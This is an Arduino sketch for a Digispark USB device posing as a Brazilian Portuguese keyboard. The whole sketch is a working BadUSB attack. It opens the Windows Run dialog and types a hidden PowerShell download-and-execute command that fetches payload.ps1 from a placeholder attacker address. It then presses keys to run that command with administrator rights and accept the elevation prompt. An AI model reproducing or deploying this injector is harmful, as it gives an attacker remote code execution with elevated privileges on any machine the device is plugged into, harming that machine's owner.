#include <DigiKeyboardPtBr.h>
#include <keylayouts.h>
#include <oddebug.h>
#include <osccal.h>
#include <osctune.h>
#include <scancode-ascii-table.h>
#include <usbboardconfig.h>
#include <usbconfig-prototype.h>
#include <usbconfig.h>
#include <usbdrv.h>
#include <usbportability.h>
#include <string.h>

void setup() {
}

void loop() {
  digitalWrite(1, HIGH); // LED on <--> Action start
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("powershell -WindowStyle hidden -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://IP_DO_ATACANTE/payload.ps1')\"");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  digitalWrite(1, LOW); // LED off <--> Action end
  for (;;) {
    DigiKeyboardPtBr.delay(100);
  }
}
